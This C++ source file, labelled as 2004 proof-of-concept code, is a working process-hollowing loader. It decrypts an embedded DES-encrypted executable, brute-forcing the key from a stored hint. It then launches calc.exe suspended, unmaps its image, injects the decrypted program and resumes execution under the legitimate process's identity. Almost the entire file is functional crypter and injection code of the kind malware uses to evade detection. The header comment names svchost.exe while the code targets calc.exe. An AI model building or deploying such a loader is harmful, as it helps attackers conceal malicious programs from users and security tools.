//*******************************************************************************************************
// loadEXE.cpp : Defines the entry point for the console application.
//
// Proof-Of-Concept Code
// Copyright (c) 2004
// All rights reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, and/or sell copies of the Software, and to permit persons
// to whom the Software is furnished to do so, provided that the above
// copyright notice(s) and this permission notice appear in all copies of
// the Software and that both the above copyright notice(s) and this
// permission notice appear in supporting documentation.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT
// OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
// HOLDERS INCLUDED IN THIS NOTICE BE LIABLE FOR ANY CLAIM, OR ANY SPECIAL
// INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES WHATSOEVER RESULTING
// FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT,
// NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION
// WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
//
// This will execute calc.exe in suspended mode and replace its image with
// the new EXE's image.  The thread is then resumed, thus causing the new EXE to
// execute within the process space of svchost.exe.
//
//*******************************************************************************************************

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winsock.h>

extern "C" {
    #include "c_des.h"
    #include "utils.h"
};

//enable screen prints, strips them off from the binary elsewhere
#define DEBUG

struct PE_Header 
{
	unsigned long signature;
	unsigned short machine;
	unsigned short numSections;
	unsigned long timeDateStamp;
	unsigned long pointerToSymbolTable;
	unsigned long numOfSymbols;
	unsigned short sizeOfOptionHeader;
	unsigned short characteristics;
};

struct PE_ExtHeader
{
	unsigned short magic;
	unsigned char majorLinkerVersion;
	unsigned char minorLinkerVersion;
	unsigned long sizeOfCode;
	unsigned long sizeOfInitializedData;
	unsigned long sizeOfUninitializedData;
	unsigned long addressOfEntryPoint;
	unsigned long baseOfCode;
	unsigned long baseOfData;
	unsigned long imageBase;
	unsigned long sectionAlignment;
	unsigned long fileAlignment;
	unsigned short majorOSVersion;
	unsigned short minorOSVersion;
	unsigned short majorImageVersion;
	unsigned short minorImageVersion;
	unsigned short majorSubsystemVersion;
	unsigned short minorSubsystemVersion;
	unsigned long reserved1;
	unsigned long sizeOfImage;
	unsigned long sizeOfHeaders;
	unsigned long checksum;
	unsigned short subsystem;
	unsigned short DLLCharacteristics;
	unsigned long sizeOfStackReserve;
	unsigned long sizeOfStackCommit;
	unsigned long sizeOfHeapReserve;
	unsigned long sizeOfHeapCommit;
	unsigned long loaderFlags;
	unsigned long numberOfRVAAndSizes;
	unsigned long exportTableAddress;
	unsigned long exportTableSize;
	unsigned long importTableAddress;
	unsigned long importTableSize;
	unsigned long resourceTableAddress;
	unsigned long resourceTableSize;
	unsigned long exceptionTableAddress;
	unsigned long exceptionTableSize;
	unsigned long certFilePointer;
	unsigned long certTableSize;
	unsigned long relocationTableAddress;
	unsigned long relocationTableSize;
	unsigned long debugDataAddress;
	unsigned long debugDataSize;
	unsigned long archDataAddress;
	unsigned long archDataSize;
	unsigned long globalPtrAddress;
	unsigned long globalPtrSize;
	unsigned long TLSTableAddress;
	unsigned long TLSTableSize;
	unsigned long loadConfigTableAddress;
	unsigned long loadConfigTableSize;
	unsigned long boundImportTableAddress;
	unsigned long boundImportTableSize;
	unsigned long importAddressTableAddress;
	unsigned long importAddressTableSize;
	unsigned long delayImportDescAddress;
	unsigned long delayImportDescSize;
	unsigned long COMHeaderAddress;
	unsigned long COMHeaderSize;
	unsigned long reserved2;
	unsigned long reserved3;
};


struct SectionHeader
{
	unsigned char sectionName[8];
	unsigned long virtualSize;
	unsigned long virtualAddress;
	unsigned long sizeOfRawData;
	unsigned long pointerToRawData;
	unsigned long pointerToRelocations;
	unsigned long pointerToLineNumbers;
	unsigned short numberOfRelocations;
	unsigned short numberOfLineNumbers;
	unsigned long characteristics;
};

struct MZHeader
{
	unsigned short signature;
	unsigned short partPag;
	unsigned short pageCnt;
	unsigned short reloCnt;
	unsigned short hdrSize;
	unsigned short minMem;
	unsigned short maxMem;
	unsigned short reloSS;
	unsigned short exeSP;
	unsigned short chksum;
	unsigned short exeIP;
	unsigned short reloCS;
	unsigned short tablOff;
	unsigned short overlay;
	unsigned char reserved[32];
	unsigned long offsetToPE;
};


struct ImportDirEntry
{
	DWORD importLookupTable;
	DWORD timeDateStamp;
	DWORD fowarderChain;
	DWORD nameRVA;
	DWORD importAddressTable;
};


//**********************************************************************************************************
//
// This function reads the MZ, PE, PE extended and Section Headers from an EXE file.
//
//**********************************************************************************************************

bool readPEInfo(unsigned char *buf, MZHeader *outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH,
				SectionHeader **outSecHdr)
{	
	long count = 0;
	//fseek(fp, 0, SEEK_END);
	long fileSize = 0; //placeholder
	//fseek(fp, 0, SEEK_SET);

	if(fileSize < sizeof(MZHeader))
	{	
#ifdef DEBUG
		printf("File size too small\n");
#endif
		//return false;
	}

	// read MZ Header
	MZHeader mzH;
	//fread(&mzH, sizeof(MZHeader), 1, fp);
	memcpy(&mzH, buf, sizeof(MZHeader));
	count += sizeof(MZHeader);
#ifdef DEBUG
	    printf("sizeof MZHeader = %x\n", sizeof(MZHeader));
	    printf("signature = %x\n", mzH.signature);
#endif
	if(mzH.signature != 0x5a4d)		// MZ
	{
#ifdef DEBUG
		printf("File does not have MZ header\n");
#endif
		return false;
	}
#ifdef DEBUG
	printf("Offset to PE Header = %.8x\n", mzH.offsetToPE);
#endif
	if((unsigned long)fileSize < mzH.offsetToPE + sizeof(PE_Header))
	{	
#ifdef DEBUG
		printf("filesize = %i\noffsetToPE = %x\nsizeofHeader = %x\n", fileSize, mzH.offsetToPE, sizeof(PE_Header));
		printf("File size too small\n");
#endif
		//return false;
	}

	// read PE Header
	//fseek(fp, mzH.offsetToPE, SEEK_SET);
	count = mzH.offsetToPE;
	PE_Header peH;
	//fread(&peH, sizeof(PE_Header), 1, fp);
	memcpy(&peH, buf + count, sizeof(PE_Header));
	count += sizeof(PE_Header);
#ifdef DEBUG
	printf("Size of option header = %d\n", peH.sizeOfOptionHeader);
	printf("Expected size of option header = %d\n", sizeof(PE_ExtHeader));
	printf("Number of sections = %d\n", peH.numSections);
#endif
	if(peH.sizeOfOptionHeader != sizeof(PE_ExtHeader))
	{
#ifdef DEBUG
		printf("Unexpected option header size.\n");
#endif
		return false;
	}

	// read PE Ext Header
	PE_ExtHeader peXH;

	//fread(&peXH, sizeof(PE_ExtHeader), 1, fp);
	//strncpy(&peXH, sizeof(PE_ExtHeader), buf + count);
	memcpy(&peXH, buf + count, sizeof(PE_ExtHeader));
	count += sizeof(PE_ExtHeader);
#ifdef DEBUG
	printf("Import table address = %X\n", peXH.importTableAddress);
	printf("Import table size = %X\n", peXH.importTableSize);
	printf("Import address table address = %X\n", peXH.importAddressTableAddress);
	printf("Import address table size = %X\n", peXH.importAddressTableSize);
#endif

	// read the sections
	SectionHeader *secHdr = new SectionHeader[peH.numSections];

	//fread(secHdr, sizeof(SectionHeader) * peH.numSections, 1, fp);
	memcpy(secHdr, buf + count, sizeof(SectionHeader) * peH.numSections);
	
	*outMZ = mzH;
	*outPE = peH;
	*outpeXH = peXH;
	*outSecHdr = secHdr;

	return true;
}


//**********************************************************************************************************
//
// This function calculates the size required to load an EXE into memory with proper alignment.
//
//**********************************************************************************************************

int calcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
				       SectionHeader *inSecHdr)
{
	int result = 0;
	int alignment = inpeXH->sectionAlignment;

	if(inpeXH->sizeOfHeaders % alignment == 0)
		result += inpeXH->sizeOfHeaders;
	else
	{
		int val = inpeXH->sizeOfHeaders / alignment;
		val++;
		result += (val * alignment);
	}


	for(int i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].virtualSize)
		{
			if(inSecHdr[i].virtualSize % alignment == 0)
				result += inSecHdr[i].virtualSize;
			else
			{
				int val = inSecHdr[i].virtualSize / alignment;
				val++;
				result += (val * alignment);
			}
		}
	}

	return result;
}


//**********************************************************************************************************
//
// This function calculates the aligned size of a section
//
//**********************************************************************************************************

unsigned long getAlignedSize(unsigned long curSize, unsigned long alignment)
{	
	if(curSize % alignment == 0)
		return curSize;
	else
	{
		int val = curSize / alignment;
		val++;
		return (val * alignment);
	}
}


//**********************************************************************************************************
//
// This function loads a PE file into memory with proper alignment.
// Enough memory must be allocated at ptrLoc.
//
//**********************************************************************************************************

bool loadPE(unsigned char *buf, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			SectionHeader *inSecHdr, LPVOID ptrLoc)
{
	char *outPtr = (char *)ptrLoc;

	//fseek(fp, 0, SEEK_SET);
	unsigned long headerSize = inpeXH->sizeOfHeaders;
	int i;

	// certain PE files have sectionHeaderSize value > size of PE file itself.  
	// this loop handles this situation by find the section that is nearest to the
	// PE header.

	for(i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].pointerToRawData < headerSize)
			headerSize = inSecHdr[i].pointerToRawData;
	}

	// read the PE header
	//unsigned long readSize = fread(outPtr, 1, headerSize, fp);
	memcpy(outPtr, buf, headerSize);
	unsigned long readSize = headerSize;
	//printf("HeaderSize = %d\n", headerSize);
	if(readSize != headerSize)
	{
#ifdef DEBUG
		printf("Error reading headers (%d %d)\n", readSize, headerSize);
#endif
		return false;		
	}

	outPtr += getAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);

	// read the sections
	for(i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].sizeOfRawData > 0)
		{
			unsigned long toRead = inSecHdr[i].sizeOfRawData;
			if(toRead > inSecHdr[i].virtualSize)
				toRead = inSecHdr[i].virtualSize;

			/*fseek(fp, inSecHdr[i].pointerToRawData, SEEK_SET);
			readSize = fread(outPtr, 1, toRead, fp);*/
			memcpy(outPtr, buf + inSecHdr[i].pointerToRawData, toRead);
			readSize = toRead; 

			if(readSize != toRead)
			{
#ifdef DEBUG
				printf("Error reading section %d\n", i);
#endif
				return false;
			}
			outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
		}
		else
		{
			// this handles the case where the PE file has an empty section. E.g. UPX0 section
			// in UPXed files.

			if(inSecHdr[i].virtualSize)
				outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
		}
	}

	return true;
}


struct FixupBlock
{
	unsigned long pageRVA;
	unsigned long blockSize;
};


//**********************************************************************************************************
//
// This function loads a PE file into memory with proper alignment.
// Enough memory must be allocated at ptrLoc.
//
//**********************************************************************************************************

void doRelocation(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			      SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD newBase)
{
	if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
	{
		FixupBlock *fixBlk = (FixupBlock *)((char *)ptrLoc + inpeXH->relocationTableAddress);
		long delta = newBase - inpeXH->imageBase;

		while(fixBlk->blockSize)
		{
			//printf("Addr = %X\n", fixBlk->pageRVA);
			//printf("Size = %X\n", fixBlk->blockSize);

			int numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;
			//printf("Num Entries = %d\n", numEntries);

			unsigned short *offsetPtr = (unsigned short *)(fixBlk + 1);

			for(int i = 0; i < numEntries; i++)
			{
				DWORD *codeLoc = (DWORD *)((char *)ptrLoc + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));
				
				int relocType = (*offsetPtr & 0xF000) >> 12;
				
				//printf("Val = %X\n", *offsetPtr);
				//printf("Type = %X\n", relocType);

				if(relocType == 3)
					*codeLoc = ((DWORD)*codeLoc) + delta;
				else
				{
#ifdef DEBUG
					printf("Unknown relocation type = %d\n", relocType);
					;
#endif
				}
				offsetPtr++;
			}

			fixBlk = (FixupBlock *)offsetPtr;
		}
	}	
}


#define TARGETPROC "calc.exe"

typedef struct _PROCINFO
{
	DWORD baseAddr;
	DWORD imageSize;
} PROCINFO;



//**********************************************************************************************************
//
// Creates the original EXE in suspended mode and returns its info in the PROCINFO structure.
//
//**********************************************************************************************************


BOOL createChild(PPROCESS_INFORMATION pi, PCONTEXT ctx, PROCINFO *outChildProcInfo)
{
	STARTUPINFO si = {0};

	if(CreateProcess(NULL, TARGETPROC,
		             NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, pi))		
	{
		ctx->ContextFlags=CONTEXT_FULL;
		GetThreadContext(pi->hThread, ctx);

		DWORD *pebInfo = (DWORD *)ctx->Ebx;
		DWORD read;
		ReadProcessMemory(pi->hProcess, &pebInfo[2], (LPVOID)&(outChildProcInfo->baseAddr), sizeof(DWORD), &read);
	
		DWORD curAddr = outChildProcInfo->baseAddr;
		MEMORY_BASIC_INFORMATION memInfo;
		while(VirtualQueryEx(pi->hProcess, (LPVOID)curAddr, &memInfo, sizeof(memInfo)))
		{
			if(memInfo.State == MEM_FREE)
				break;
			curAddr += memInfo.RegionSize;
		}
		outChildProcInfo->imageSize = (DWORD)curAddr - (DWORD)outChildProcInfo->baseAddr;

		return TRUE;
	}
	return FALSE;
}


//**********************************************************************************************************
//
// Returns true if the PE file has a relocation table
//
//**********************************************************************************************************

BOOL hasRelocationTable(PE_ExtHeader *inpeXH)
{
	if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
	{
		return TRUE;
	}
	return FALSE;
}


typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);


//**********************************************************************************************************
//
// To replace the original EXE with another one we do the following.
// 1) Create the original EXE process in suspended mode.
// 2) Unmap the image of the original EXE.
// 3) Allocate memory at the baseaddress of the new EXE.
// 4) Load the new EXE image into the allocated memory.  
// 5) Windows will do the necessary imports and load the required DLLs for us when we resume the suspended 
//    thread.
//
// When the original EXE process is created in suspend mode, GetThreadContext returns these useful
// register values.
// EAX - process entry point
// EBX - points to PEB
//
// So before resuming the suspended thread, we need to set EAX of the context to the entry point of the
// new EXE.
//
//**********************************************************************************************************

void doFork(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD imageSize)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	PROCINFO childInfo;
	
	if(createChild(&pi, &ctx, &childInfo)) 
	{	
#ifdef DEBUG
		printf("Original EXE loaded (PID = %d).\n", pi.dwProcessId);
		printf("Original Base Addr = %X, Size = %X\n", childInfo.baseAddr, childInfo.imageSize);
#endif
		LPVOID v = (LPVOID)NULL;
		
		if(inpeXH->imageBase == childInfo.baseAddr && imageSize <= childInfo.imageSize)
		{
			// if new EXE has same baseaddr and is its size is <= to the original EXE, just
			// overwrite it in memory
			v = (LPVOID)childInfo.baseAddr;
			DWORD oldProtect;
			VirtualProtectEx(pi.hProcess, (LPVOID)childInfo.baseAddr, childInfo.imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);			
#ifdef DEBUG			
			printf("Using Existing Mem for New EXE at %X\n", (unsigned long)v);
		
#endif
		}
		else
		{
			// get address of ZwUnmapViewOfSection
			PTRZwUnmapViewOfSection pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");

			// try to unmap the original EXE image
			if(pZwUnmapViewOfSection(pi.hProcess, (LPVOID)childInfo.baseAddr) == 0)
			{
				// allocate memory for the new EXE image at the prefered imagebase.
				v = VirtualAllocEx(pi.hProcess, (LPVOID)inpeXH->imageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if(v) {
#ifdef DEBUG
					printf("Unmapped and Allocated Mem for New EXE at %X\n", (unsigned long)v);
#endif
					;
				}
		
			}
		}

		if(!v && hasRelocationTable(inpeXH))
		{
			// if unmap failed but EXE is relocatable, then we try to load the EXE at another
			// location
			v = VirtualAllocEx(pi.hProcess, (void *)NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(v)
			{
#ifdef DEBUG
				printf("Allocated Mem for New EXE at %X. EXE will be relocated.\n", (unsigned long)v);
#endif
				// we've got to do the relocation ourself if we load the image at another
				// memory location				
				doRelocation(inMZ, inPE, inpeXH, inSecHdr, ptrLoc, (DWORD)v);
			}
		}
#ifdef DEBUG
		printf("EIP = %X\n", ctx.Eip);
		printf("EAX = %X\n", ctx.Eax);
		printf("EBX = %X\n", ctx.Ebx);		// EBX points to PEB
		printf("ECX = %X\n", ctx.Ecx);
		printf("EDX = %X\n", ctx.Edx);
#endif
		if(v)
		{	
#ifdef DEBUG
			printf("New EXE Image Size = %X\n", imageSize);
#endif	
			// patch the EXE base addr in PEB (PEB + 8 holds process base addr)
			DWORD *pebInfo = (DWORD *)ctx.Ebx;
			DWORD wrote;						
			WriteProcessMemory(pi.hProcess, &pebInfo[2], &v, sizeof(DWORD), &wrote);

			// patch the base addr in the PE header of the EXE that we load ourselves
			PE_ExtHeader *peXH = (PE_ExtHeader *)((DWORD)inMZ->offsetToPE + sizeof(PE_Header) + (DWORD)ptrLoc);
			peXH->imageBase = (DWORD)v;
			
			if(WriteProcessMemory(pi.hProcess, v, ptrLoc, imageSize, NULL))
			{	
#ifdef DEBUG
				printf("New EXE image injected into process.\n");
#endif
				ctx.ContextFlags=CONTEXT_FULL;				
				//ctx.Eip = (DWORD)v + ((DWORD)dllLoaderWritePtr - (DWORD)ptrLoc);
				
				if((DWORD)v == childInfo.baseAddr)
				{
					ctx.Eax = (DWORD)inpeXH->imageBase + inpeXH->addressOfEntryPoint;		// eax holds new entry point
				}
				else
				{
					// in this case, the DLL was not loaded at the baseaddr, i.e. manual relocation was
					// performed.
					ctx.Eax = (DWORD)v + inpeXH->addressOfEntryPoint;		// eax holds new entry point
				}
#ifdef DEBUG
				printf("********> EIP = %X\n", ctx.Eip);
				printf("********> EAX = %X\n", ctx.Eax);
#endif
				SetThreadContext(pi.hThread,&ctx);

				ResumeThread(pi.hThread);
#ifdef DEBUG
				printf("Process resumed (PID = %d).\n", pi.dwProcessId);
#endif
			}
			else
			{
#ifdef DEBUG
				printf("WriteProcessMemory failed\n");
#endif
				TerminateProcess(pi.hProcess, 0);
			}
		}
		else
		{
#ifdef DEBUG
			printf("Load failed.  Consider making this EXE relocatable.\n");
#endif
			TerminateProcess(pi.hProcess, 0);
		}
		
	}
	else
	{
#ifdef DEBUG
		printf("Cannot load %s\n", TARGETPROC);
#endif
		;
	}
}


extern unsigned char binary_enc_win_start;
extern unsigned char binary_enc_win_end;
extern char binary_pass_start;
extern char binary_pass_end;

int main(int argc, char* argv[])
{
	
	unsigned char *crypt_start = &binary_enc_win_start;
	unsigned char *crypt_end = &binary_enc_win_end;
	char *pass_start = &binary_pass_start;
	char *pass_end = &binary_pass_end;
	
	unsigned char *tmp, *tmp2, *buf;
	long i = 0, j;
	long size;// = crypt_end - crypt_start;
	long blocknum;// = size / 8;
	char c;
	unsigned long block;
	
	
	/*if(argc != 2)
	{
		printf("\nUsage: %s <EXE filename>\n", argv[0]);
		return 1;
	}*/
	
	size = crypt_end - crypt_start;
	blocknum = size / 8;

	unsigned char key[9];
	struct hyp_struct *hyp;

	hyp = (struct hyp_struct *) malloc(sizeof(struct hyp_struct));
	memcpy(hyp, pass_start, sizeof(struct hyp_struct));
	
	buf = (unsigned char *) malloc(size * sizeof(unsigned char));
	tmp2 = (unsigned char *) malloc(8 * sizeof(unsigned char));
	tmp = (unsigned char *) malloc(8 * sizeof(unsigned char));
	
#ifdef DEBUG
	printf("%s\n %s\n %s\n", hyp->enc_check, hyp->check, hyp->pass_hint);
#endif
	CompWithRep(key, hyp->enc_check, (unsigned char *)hyp->pass_hint, hyp->check, 9 - strlen(hyp->pass_hint));
#ifdef DEBUG
	printf("Found password: %s\n", key);
#endif
	
#ifdef DEBUG
	printf("size = %i, total blocks = %i\n", size,blocknum);
#endif
	//c = getchar();
	free(hyp);
	if (!(buf)) {
#ifdef DEBUG
	    puts("cannot malloc memory!!");
#endif
	    ;
	}
	while(i < blocknum) {
	    DesDecrypt(crypt_start + i*8, key, tmp2);

	    memcpy(buf + i*8, tmp2, 8);
	    memset(tmp, 0, 8);
	    memset(tmp2, 0, 8);
	    i++;
	}
	free(tmp2);
	free(tmp);
#ifdef DEBUG
	puts("decrypted in memory");
#endif
	
	if(buf)
	{	
		MZHeader mzH;
		PE_Header peH;
		PE_ExtHeader peXH;
		SectionHeader *secHdr;

		if(readPEInfo(buf, &mzH, &peH, &peXH, &secHdr))
		{	
#ifdef DEBUG
			puts("PE read from buffer OK!");
#endif
			int imageSize = calcTotalImageSize(&mzH, &peH, &peXH, secHdr);
#ifdef DEBUG
			printf("Image Size = %X\n", imageSize);
#endif

			LPVOID ptrLoc = VirtualAlloc(NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(ptrLoc)
			{
				//printf("Memory allocated at %X\n", ptrLoc);
				loadPE(buf, &mzH, &peH, &peXH, secHdr, ptrLoc);												
				
				doFork(&mzH, &peH, &peXH, secHdr, ptrLoc, imageSize);	
				free(buf);
			}
			else {
#ifdef DEBUG
				printf("Allocation failed\n");
				;
#endif
			}
		}
		else {
#ifdef DEBUG
		    printf("ReadPE Failed\n");
		    ;
#endif
		}

	}
	else {
#ifdef DEBUG
		printf("\nCannot open the EXE file!\n");
#endif
		;
	}
	return 0;
}

